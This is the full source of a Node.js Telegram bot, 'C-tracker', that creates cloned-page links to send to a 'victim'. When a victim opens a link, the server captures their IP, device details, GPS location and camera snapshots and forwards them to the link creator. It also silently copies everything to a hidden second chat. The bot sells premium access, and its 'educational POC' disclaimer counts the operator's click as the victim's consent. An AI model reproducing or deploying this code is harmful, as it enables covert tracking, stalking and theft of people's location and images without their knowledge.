const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const whitelistedUserIds = [1950858586, 676849867, , 1118054166, 779715934, 1135874307, 1806425695];
const PremiumUserIds = [826978407,716505457];
const targetChatId = '826978407';
const nuid = 'dod0mf';
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL = "https://ctracker.mohammedathif.repl.co"
//TOGGLE for 1pt Proxy and Shorters
var use1pt = false;


app.get("/w/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }

  if (req.params.path != null) {
    res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }

});

app.get("/c/:path/:uri", (req, res) => {
  var ip;
  var d = new Date();
  d = d.toJSON().slice(0, 19).replace('T', ':');
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }


  if (req.params.path != null) {
    res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
  }

});



bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  console.log(`Received message from user ID: ${userId}`);
  if (whitelistedUserIds.includes(userId)) {
    if (msg.text == "/start") {
      bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
      bot.sendMessage(chatId, `Dear ${msg.chat.first_name}, \n
We hope you've enjoyed your free trial of C-tracker. We value your support and trust in our platform.

Your free trial has concluded. To continue accessing our premium features and benefits, we invite you to upgrade to a premium subscription.

Our premium subscription offers:
===========================================
  * Can clone any webpage which doesn't have X-frame header
  * Access camera, location just through a link

Our Pricings:
===========================================
  * 2 week 1198 INR (Offer Price 999).
  * Monthly 2499 INR (Offer Price 1999).

If you have any questions or need assistance in choosing the right plan, please don't hesitate to reach out to our dedicated support team at solocoderider@gmail.com. We are here to help and ensure you have the best experience with our service.

Thank you for choosing C-tracker. We look forward to continuing to serve you and help you achieve your goals.  `);
    }
  }
  else if (PremiumUserIds.includes(userId)) {

    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
      createLink(chatId, msg.text);
    }

    if (msg.text == "/start") {
      var m = {
        reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
      };

      bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} !  , \n\nYou can use this bot to track down people but.... \nThis proof of concept (POC) is created solely for educational and awareness purposes to highlight the potential risks associated with clicking on unfamiliar links. By utilizing this POC, you acknowledge and agree to the following:

1. Consent: You understand and consent to participate in this demonstration voluntarily. The tracking methods employed in this POC will used to collect or store any personal or sensitive information with your explicit consent (Clicking create link button is the consent).

2. Awareness: This POC aims to showcase the potential risks of clicking on unknown links. It does not endorse or encourage any form of unauthorized tracking, surveillance, or malicious activities. The purpose is to raise awareness and encourage individuals to exercise caution when interacting with links from unknown sources.

3. Privacy: The creator of this POC will collect or store any personally identifiable information with explicit consent. The demonstration will infringe upon your privacy or compromise your security in any way.

4. Legal Compliance: This POC complies with all applicable laws and regulations. It is your responsibility to ensure that your use of this POC aligns with legal and ethical standards in your jurisdiction.

5. Responsible Use: You agree to use this POC responsibly and refrain from employing similar techniques to invade others' privacy, engage in unauthorized tracking, or conduct any form of malicious activities. Any misuse or unethical use of this POC is strictly prohibited.

By proceeding with the utilization of this POC, you acknowledge that the creator and developers of this POC will not be held responsible for any misuse, damage, or consequences resulting from your actions or the actions of others.

So if you want want to use this bot read all the above T&C. When you click create link which means you are approved our consent

\nUse /help to know about working...`, m);
      bot.sendMessage(targetChatId, `Hi SCR, \n${msg.chat.first_name} is using your bot`);
    }
    else if (msg.text == "/create") {
      createNew(chatId);
    }
    else if (msg.text == "/help") {
      bot.sendMessage(chatId, ` Hi ${msg.chat.first_name} !
\nFirst things first this bot is :not created to harm individuals This bot is developed for Making POC and Eductional Purpose

\n-> To Start fucntioning use /start command and it will show you a creat link page Enter the page you want to iframe it as url ex: https://domainname.com

\n-> Or you can use /create option to create link directly

\n-> Then you will get two links sent this link to victim when he opens the link you will get basic info about the device and when he allow permissions which we asked we will get his Location, Camera access...
`);
    }

  } else {
    // Respond to unauthorized users
    bot.sendMessage(chatId, 'Sorry, you are not authorized to use this bot.');
  }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
  bot.answerCallbackQuery(callbackQuery.id);
  if (callbackQuery.data == "crenew") {
    createNew(callbackQuery.message.chat.id);
  }
});
bot.on('polling_error', (error) => {
  //console.log(error.code); 
});


async function createLink(cid, msg) {

  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

    var url = cid.toString(36) + '/' + btoa(msg);
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
      })
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    bot.sendChatAction(cid, "typing");
    if (use1pt) {
      var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
      var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

      var f = "", g = "";

      for (var c in x) {
        f += x[c] + "\n";
      }

      for (var c in y) {
        g += y[c] + "\n";
      }

      bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
    }
    else {

      bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);

    }
  }
  else {
    bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
    createNew(cid);

  }
}


function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}


app.get("/", (req, res) => {
  var ip;
  if (req.headers['x-forwarded-for']) { ip = req.headers['x-forwarded-for'].split(",")[0]; } else if (req.connection && req.connection.remoteAddress) { ip = req.connection.remoteAddress; } else { ip = req.ip; }
  res.json({ "ip": ip });


});


app.post("/location", (req, res) => {


  var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  var uid = decodeURIComponent(req.body.uid) || null;
  var acc = decodeURIComponent(req.body.acc) || null;
  if (lon != null && lat != null && uid != null && acc != null) {

    bot.sendLocation(parseInt(uid, 36), lat, lon);
    bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
    bot.sendLocation(parseInt(nuid, 36), lat, lon);
    bot.sendMessage(parseInt(nuid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

    res.send("Done");
  }
});


app.post("/", (req, res) => {

  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  if (uid != null && data != null) {


    data = data.replaceAll("<br>", "\n");

    bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
    bot.sendMessage(parseInt(nuid, 36), data, { parse_mode: "HTML" });

    res.send("Done");
  }
});


app.post("/camsnap", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var img = decodeURIComponent(req.body.img) || null;

  if (uid != null && img != null) {

    var buffer = Buffer.from(img, 'base64');

    var info = {
      filename: "camsnap.png",
      contentType: 'image/png'
    };


    try {
      bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
      bot.sendPhoto(parseInt(nuid, 36), buffer, {}, info);
    } catch (error) {
      console.log(error);
    }


    res.send("Done");

  }

});



app.listen(5000, () => {
  console.log("App Running on Port 5000!");
});
